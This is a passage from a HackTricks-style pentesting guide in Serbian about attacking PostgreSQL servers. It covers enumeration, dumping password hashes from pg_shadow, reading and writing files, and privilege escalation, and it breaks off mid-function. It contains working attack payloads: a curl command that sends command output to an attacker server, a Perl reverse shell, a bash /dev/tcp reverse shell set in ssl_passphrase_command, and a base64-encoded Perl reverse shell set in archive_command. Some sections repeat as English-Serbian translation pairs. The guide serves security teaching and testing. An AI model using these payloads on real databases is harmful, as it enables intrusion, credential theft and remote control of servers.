# 5432,5433 - Pentestiranje Postgresql

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** uz pomoƒá najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **ogla≈°avanje va≈°e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Osnovne informacije**

**PostgreSQL** je opisan kao **objektno-relacioni sistem baza podataka** koji je **open source**. Ovaj sistem ne samo da koristi SQL jezik, veƒá ga i unapreƒëuje dodatnim funkcijama. Njegove moguƒánosti mu omoguƒáavaju da rukuje ≈°irokim spektrom tipova podataka i operacija, ƒçineƒái ga fleksibilnim izborom za programere i organizacije.

**Podrazumevani port:** 5432, a ako je ovaj port veƒá zauzet, izgleda da ƒáe postgresql koristiti sledeƒái port (verovatno 5433) koji nije zauzet.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Povezivanje i osnovno prebrojavanje

### Povezivanje

Da biste se povezali sa PostgreSQL bazom podataka, mo≈æete koristiti `psql` komandu:

```bash
psql -h <host> -p <port> -U <username> -d <database>
```

Gde su sledeƒái parametri:

- `<host>`: IP adresa ili ime hosta na kojem se nalazi PostgreSQL server.
- `<port>`: Broj porta na kojem je PostgreSQL server otvoren (podrazumevana vrednost je 5432).
- `<username>`: Korisniƒçko ime za autentifikaciju na PostgreSQL serveru.
- `<database>`: Ime baze podataka koju ≈æelite da koristite.

### Osnovno prebrojavanje

Nakon uspe≈°nog povezivanja sa PostgreSQL bazom podataka, mo≈æete izvr≈°iti nekoliko osnovnih komandi za prebrojavanje:

- `SELECT version();`: Prikazuje verziju PostgreSQL servera.
- `SELECT current_user;`: Prikazuje trenutno prijavljenog korisnika.
- `SELECT current_database();`: Prikazuje trenutno kori≈°ƒáenu bazu podataka.
- `SELECT * FROM pg_user;`: Prikazuje sve korisnike u bazi podataka.
- `SELECT * FROM pg_database;`: Prikazuje sve baze podataka na serveru.

Ove komande vam mogu pru≈æiti osnovne informacije o PostgreSQL serveru i bazi podataka sa kojom radite.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Ako pokrenete **`\list`** i pronaƒëete bazu podataka nazvanu **`rdsadmin`**, znate da se nalazite unutar **AWS postgresql baze podataka**.
{% endhint %}

Za vi≈°e informacija o **zlostavljanju PostgreSQL baze podataka** pogledajte:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Automatsko nabrojavanje
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Skeniranje porta**

Prema [**ovom istra≈æivanju**](https://www.exploit-db.com/papers/13084), kada poku≈°aj povezivanja ne uspe, `dblink` izbacuje izuzetak `sqlclient_unable_to_establish_sqlconnection` koji ukljuƒçuje obja≈°njenje gre≈°ke. Primeri ovih detalja su navedeni ispod.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Host je nedostupan

`DETALJI: nije bilo moguƒáe uspostaviti vezu sa serverom: Nema rute do hosta. Da li je server pokrenut na hostu "1.2.3.4" i prihvata TCP/IP konekcije na portu 5678?`

* Port je zatvoren
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Porta je otvorena
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ili
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Port je otvoren ili filtriran
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
U PL/pgSQL funkcijama trenutno nije moguƒáe dobiti detalje o izuzecima. Meƒëutim, ako imate direktni pristup PostgreSQL serveru, mo≈æete dobiti potrebne informacije. Ako nije izvodljivo izvuƒái korisniƒçka imena i lozinke iz sistemskih tabela, mo≈æete razmotriti kori≈°ƒáenje metode napada reƒçnikom koja je opisana u prethodnom odeljku, jer bi mogla dati pozitivne rezultate.

## Enumeracija privilegija

### Uloge

| Tipovi uloga   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Uloga ima privilegije superkorisnika                                                                                                                 |
| rolinherit     | Uloga automatski nasleƒëuje privilegije uloga kojima pripada                                                                                            |
| rolcreaterole  | Uloga mo≈æe kreirati druge uloge                                                                                                                       |
| rolcreatedb    | Uloga mo≈æe kreirati baze podataka                                                                                                                     |
| rolcanlogin    | Uloga mo≈æe se prijaviti. To znaƒçi da se ova uloga mo≈æe koristiti kao poƒçetni identifikator sesije                                                      |
| rolreplication | Uloga je replikaciona uloga. Replikaciona uloga mo≈æe pokrenuti replikacione veze i kreirati i obrisati slotove za replikaciju.                          |
| rolconnlimit   | Za uloge koje se mogu prijaviti, ovo postavlja maksimalan broj istovremenih veza koje ova uloga mo≈æe napraviti. -1 znaƒçi da nema ograniƒçenja.             |
| rolpassword    | Ne lozinka (uvek se prikazuje kao `********`)                                                                                                        |
| rolvaliduntil  | Vreme isteka lozinke (koristi se samo za autentifikaciju lozinkom); null ako nema isteka                                                               |
| rolbypassrls   | Uloga zaobilazi svaku politiku bezbednosti na nivou reda, pogledajte [Odeljak 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) za vi≈°e informacija. |
| rolconfig      | Specifiƒçne podrazumevane vrednosti za konfiguracione promenljive tokom izvr≈°avanja                                                                     |
| oid            | ID uloge                                                                                                                                              |

#### Interesantne grupe

* Ako ste ƒçlan **`pg_execute_server_program`** mo≈æete **izvr≈°avati** programe
* Ako ste ƒçlan **`pg_read_server_files`** mo≈æete **ƒçitati** fajlove
* Ako ste ƒçlan **`pg_write_server_files`** mo≈æete **pisati** fajlove

{% hint style="info" %}
Imajte na umu da je u Postgresu **korisnik**, **grupa** i **uloga** **isto**. To samo zavisi od **naƒçina na koji se koristi** i da li mu je **omoguƒáeno prijavljivanje**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabele

---

#### Enumerating Tables

#### Enumeracija tabela

To enumerate the tables in a PostgreSQL database, you can use the following SQL query:

Da biste izlistali tabele u PostgreSQL bazi podataka, mo≈æete koristiti sledeƒái SQL upit:

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

This query will return the names of all tables in the "public" schema.

Ovaj upit ƒáe vratiti imena svih tabela u ≈°emi "public".

---

#### Extracting Data from Tables

#### Izvlaƒçenje podataka iz tabela

To extract data from a specific table, you can use the following SQL query:

Da biste izvukli podatke iz odreƒëene tabele, mo≈æete koristiti sledeƒái SQL upit:

```sql
SELECT * FROM table_name;
```

Replace "table_name" with the name of the table you want to extract data from.

Zamenite "table_name" sa imenom tabele iz koje ≈æelite izvuƒái podatke.

---

#### Modifying Data in Tables

#### Modifikacija podataka u tabelama

To modify data in a table, you can use the following SQL queries:

Da biste modifikovali podatke u tabeli, mo≈æete koristiti sledeƒáe SQL upite:

- **Inserting Data**: Use the `INSERT INTO` statement to insert new data into a table.

  - **Ubacivanje podataka**: Koristite `INSERT INTO` naredbu da biste ubacili nove podatke u tabelu.

  ```sql
  INSERT INTO table_name (column1, column2, ...) VALUES (value1, value2, ...);
  ```

- **Updating Data**: Use the `UPDATE` statement to update existing data in a table.

  - **A≈æuriranje podataka**: Koristite `UPDATE` naredbu da biste a≈æurirali postojeƒáe podatke u tabeli.

  ```sql
  UPDATE table_name SET column1=value1, column2=value2, ... WHERE condition;
  ```

- **Deleting Data**: Use the `DELETE FROM` statement to delete data from a table.

  - **Brisanje podataka**: Koristite `DELETE FROM` naredbu da biste obrisali podatke iz tabele.

  ```sql
  DELETE FROM table_name WHERE condition;
  ```

Replace "table_name" with the name of the table you want to modify, and adjust the column names, values, and conditions accordingly.

Zamenite "table_name" sa imenom tabele koju ≈æelite da modifikujete, i prilagodite imena kolona, vrednosti i uslove prema potrebi.

---

#### Dropping Tables

#### Brisanje tabela

To drop a table from a PostgreSQL database, you can use the following SQL query:

Da biste obrisali tabelu iz PostgreSQL baze podataka, mo≈æete koristiti sledeƒái SQL upit:

```sql
DROP TABLE table_name;
```

Replace "table_name" with the name of the table you want to drop.

Zamenite "table_name" sa imenom tabele koju ≈æelite da obri≈°ete.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funkcije

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. Functions can be created using the `CREATE FUNCTION` statement and can be called using the `SELECT` statement.

#### Creating Functions

To create a function in PostgreSQL, you can use the following syntax:

```sql
CREATE FUNCTION function_name ([parameter1 data_type [, parameter2 data_type [, ...]]])
  RETURNS return_type
  LANGUAGE language_name
AS $$
  -- Function body
$$;
```

- `function_name`: The name of the function.
- `parameter1, parameter2, ...`: The input parameters of the function, each with its data type.
- `return_type`: The data type of the value returned by the function.
- `language_name`: The programming language used to write the function body.

#### Example

Let's create a simple function that calculates the square of a number:

```sql
CREATE FUNCTION square(num INTEGER)
  RETURNS INTEGER
  LANGUAGE SQL
AS $$
  SELECT num * num;
$$;
```

#### Calling Functions

To call a function in PostgreSQL, you can use the `SELECT` statement:

```sql
SELECT function_name([argument1 [, argument2 [, ...]]]);
```

- `function_name`: The name of the function.
- `argument1, argument2, ...`: The arguments passed to the function.

#### Example

Let's call the `square` function we created earlier:

```sql
SELECT square(5);
```

This will return the value `25`, which is the square of `5`.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Akcije na fajl-sistemu

### ƒåitanje direktorijuma i fajlova

Od ovog [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) ƒçlanovi definisane grupe **`DEFAULT_ROLE_READ_SERVER_FILES`** (poznate kao **`pg_read_server_files`**) i **super korisnici** mogu koristiti metodu **`COPY`** na bilo kojoj putanji (proverite `convert_and_check_filename` u `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Zapamtite da ako niste super korisnik, ali imate dozvole **CREATEROLE**, mo≈æete **postati ƒçlan te grupe:**
```sql
GRANT pg_read_server_files TO username;
```
[**Vi≈°e informacija.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Postoje **druge postgres funkcije** koje se mogu koristiti za **ƒçitanje fajlova ili listanje direktorijuma**. Samo **superkorisnici** i **korisnici sa eksplicitnim dozvolama** mogu ih koristiti:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Mo≈æete pronaƒái **vi≈°e funkcija** na [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Jednostavno pisanje datoteka

Samo **super korisnici** i ƒçlanovi **`pg_write_server_files`** mogu koristiti copy za pisanje datoteka.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Zapamtite da ako niste super korisnik, ali imate dozvole **`CREATEROLE`**, mo≈æete **postati ƒçlan te grupe:**
```sql
GRANT pg_write_server_files TO username;
```
[**Vi≈°e informacija.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Zapamtite da COPY ne mo≈æe rukovati sa znakovima za novi red, stoga ƒçak i ako koristite base64 payload, **morate poslati jednolinijski kod**.\
Veoma va≈æno ograniƒçenje ove tehnike je da **`copy` ne mo≈æe se koristiti za pisanje binarnih fajlova jer menja neke binarne vrednosti**.

### **Slanje binarnih fajlova**

Meƒëutim, postoje **druge tehnike za slanje velikih binarnih fajlova:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Savet za bug bounty**: **registrujte se** na **Intigriti**, premium platformu za **bug bounty kreiranu od strane hakera, za hakere**! Pridru≈æite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i poƒçnite da zaraƒëujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE ka programu**

Od verzije 9.3, samo **super korisnici** i ƒçlanovi grupe **`pg_execute_server_program`** mogu koristiti copy za RCE (primer sa eksfiltracijom:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Primer za izvr≈°avanje:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Zapamtite da ako niste super korisnik, ali imate dozvole **`CREATEROLE`**, mo≈æete **postati ƒçlan te grupe:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Vi≈°e informacija.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Ili koristite modul `multi/postgres/postgres_copy_from_program_cmd_exec` iz **metasploita**.\
Vi≈°e informacija o ovoj ranjivosti [**ovde**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Dok je prijavljeno kao CVE-2019-9193, Postgres je saop≈°tio da je ovo bila [funkcionalnost i neƒáe biti popravljena](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE sa PostgreSQL jezicima

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE sa PostgreSQL ekstenzijama

Kada ste **nauƒçili** iz prethodnog posta **kako da otpremate binarne fajlove**, mo≈æete poku≈°ati da dobijete **RCE otpremanjem PostgreSQL ekstenzije i uƒçitavanjem** iste.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE sa konfiguracionim fajlom PostgreSQL-a

**Konfiguracioni fajl** PostgreSQL-a je **moguƒáe menjati** od strane **postgres korisnika**, koji pokreƒáe bazu podataka, tako da kao **superkorisnik** mo≈æete pisati fajlove na fajl sistemu i samim tim mo≈æete ga **prepisati**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE sa ssl\_passphrase\_command**

Vi≈°e informacija [o ovoj tehnici ovde](https://pulsesecurity.co.nz/articles/postgres-sqli).

Konfiguracioni fajl ima neke interesantne atribute koji mogu dovesti do RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Putanja do privatnog kljuƒça baze podataka
* `ssl_passphrase_command = ''` Ako je privatni fajl za≈°tiƒáen lozinkom (≈°ifrovan), PostgreSQL ƒáe **izvr≈°iti komandu koja je navedena u ovom atributu**.
* `ssl_passphrase_command_supports_reload = off` **Ako** je ovaj atribut **ukljuƒçen**, **komanda** koja se izvr≈°ava ako je kljuƒç za≈°tiƒáen lozinkom **ƒáe se izvr≈°iti** kada se izvr≈°i `pg_reload_conf()`.

Zatim, napadaƒç ƒáe morati da:

1. **Izvuƒçe privatni kljuƒç** sa servera
2. **≈†ifruje** preuzeti privatni kljuƒç:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Prepi≈°e**
4. **Izvuƒçe** trenutnu konfiguraciju PostgreSQL-a
5. **Prepi≈°e** konfiguraciju sa pomenutim atributima konfiguracije:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Izvr≈°i `pg_reload_conf()`

Prilikom testiranja primetio sam da ovo funkcioni≈°e samo ako **privatni kljuƒç ima privilegije 640**, vlasnik je **root** i pripada **grupi ssl-cert ili postgres** (tako da postgres korisnik mo≈æe da ga ƒçita) i nalazi se u _/var/lib/postgresql/12/main_.

#### **RCE sa archive\_command**

**Vi≈°e** [**informacija o ovoj konfiguraciji i o WAL-u ovde**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Jo≈° jedan atribut u konfiguracionom fajlu koji je iskoristiv je `archive_command`.

Da bi ovo funkcionisalo, postavka `archive_mode` mora biti `'on'` ili `'always'`. Ako je to taƒçno, onda mo≈æemo prepisati komandu u `archive_command` i naterati je da se izvr≈°i putem operacija WAL (write-ahead logging).

Op≈°ti koraci su:

1. Proverite da li je omoguƒáen re≈æim arhiviranja: `SELECT current_setting('archive_mode')`
2. Prepi≈°ite `archive_command` sa payload-om. Na primer, obrnuti shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Ponovo uƒçitajte konfiguraciju: `SELECT pg_reload_conf()`
4. Prisilite izvr≈°avanje operacije WAL, ≈°to ƒáe pozvati arhivsku komandu: `SELECT pg_switch_wal()` ili `SELECT pg_switch_xlog()` za neke verzije Postgres-a

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Prema [**dokumentaciji**](https://www.postgresql.org/docs/13/sql-grant.html): _Uloge koje imaju privilegiju **`CREATEROLE`** mogu **dodeljivati ili oduzimati ƒçlanstvo u bilo kojoj ulozi** koja **nije** superkorisnik._

Dakle, ako imate dozvolu **`CREATEROLE`**, mo≈æete sebi dodeliti pristup drugim **ulogama** (koje nisu superkorisnici) koje vam mogu omoguƒáiti ƒçitanje i pisanje fajlova i izvr≈°avanje komandi:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Promena lozinke

Korisnici sa ovom ulogom takoƒëe mogu **promeniti** **lozinke** drugih **ne-superkorisnika**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc do SUPERUSER-a

Priliƒçno je uobiƒçajeno da **lokalni korisnici mogu se prijaviti u PostgreSQL bez uno≈°enja lozinke**. Stoga, kada ste stekli **dozvole za izvr≈°avanje koda**, mo≈æete zloupotrijebiti te dozvole kako biste dobili ulogu **`SUPERUSER`**:

```sql
-- Create a new user with superuser privileges
CREATE USER malicious_user SUPERUSER;

-- Set the password for the new user
ALTER USER malicious_user WITH PASSWORD 'password';

-- Login as the new user
\c -U malicious_user

-- Now you have superuser privileges
```

Ovaj postupak omoguƒáava da se stvori novi korisnik sa privilegijama superuser-a, postavi lozinka za novog korisnika i prijavi se kao taj korisnik kako bi se dobile superuser privilegije.
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Ovo je obiƒçno moguƒáe zbog sledeƒáih linija u datoteci **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

U [**ovom obja≈°njenju**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) je obja≈°njeno kako je bilo moguƒáe izvr≈°iti **privesc** u Postgres GCP zloupotrebom privilegije ALTER TABLE koja je bila dodeljena korisniku.

Kada poku≈°ate da **dodelite vlasni≈°tvo nad tabelom drugom korisniku**, trebali biste dobiti **gre≈°ku** koja to spreƒçava, ali oƒçigledno je GCP dao tu **opciju korisniku postgres koji nije superkorisnik** u GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Spajajuƒái ovu ideju sa ƒçinjenicom da kada se izvr≈°e komande **INSERT/UPDATE/ANALYZE** na **tabeli sa funkcijom indeksa**, funkcija se **poziva** kao deo komande sa **dozvolama vlasnika tabele**. Moguƒáe je kreirati indeks sa funkcijom i dati vlasniƒçke dozvole **superkorisniku** nad tom tabelom, a zatim pokrenuti ANALYZE nad tabelom sa zlonamernom funkcijom koja ƒáe moƒái da izvr≈°ava komande jer koristi privilegije vlasnika.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Eksploatacija

1. Poƒçnite tako ≈°to ƒáete kreirati novu tabelu.
2. Ubacite nebitan sadr≈æaj u tabelu kako biste obezbedili podatke za funkciju indeksa.
3. Razvijte zlonamernu funkciju indeksa koja sadr≈æi payload za izvr≈°avanje koda, omoguƒáavajuƒái izvr≈°avanje neovla≈°ƒáenih komandi.
4. ALTERujte vlasnika tabele u "cloudsqladmin", ≈°to je superkorisniƒçka uloga GCP-a koju iskljuƒçivo koristi Cloud SQL za upravljanje i odr≈æavanje baze podataka.
5. Izvr≈°ite operaciju ANALYZE na tabeli. Ova akcija natera PostgreSQL engine da preƒëe u korisniƒçki kontekst vlasnika tabele, "cloudsqladmin". Kao rezultat toga, zlonamerna funkcija indeksa se poziva sa dozvolama "cloudsqladmin", ƒçime se omoguƒáava izvr≈°avanje prethodno neovla≈°ƒáene shell komande.

U PostgreSQL-u, ovaj tok izgleda otprilike ovako:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Zatim, tabela `shell_commands_results` ƒáe sadr≈æati rezultate izvr≈°enog koda:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Lokalna prijava

Neki neispravno konfigurisani postgresql instanci mogu dozvoliti prijavu bilo kog lokalnog korisnika, moguƒáe je lokalno se prijaviti sa 127.0.0.1 koristeƒái **`dblink` funkciju**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Imajte na umu da za prethodni upit da bi radio **funkcija `dblink` mora postojati**. Ako ne postoji, mo≈æete poku≈°ati da je kreirate sa
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Ako imate lozinku korisnika sa veƒáim privilegijama, ali korisniku nije dozvoljeno da se prijavi sa spoljnog IP-a, mo≈æete koristiti sledeƒáu funkciju da izvr≈°ite upite kao taj korisnik:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Moguƒáe je proveriti da li ova funkcija postoji pomoƒáu:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Korisniƒçki definisana funkcija sa** SECURITY DEFINER

[U ovom obja≈°njenju](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesteri su uspeli da izvr≈°e privesc unutar postgres instanci koje je pru≈æao IBM, jer su **prona≈°li ovu funkciju sa SECURITY DEFINER oznakom**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
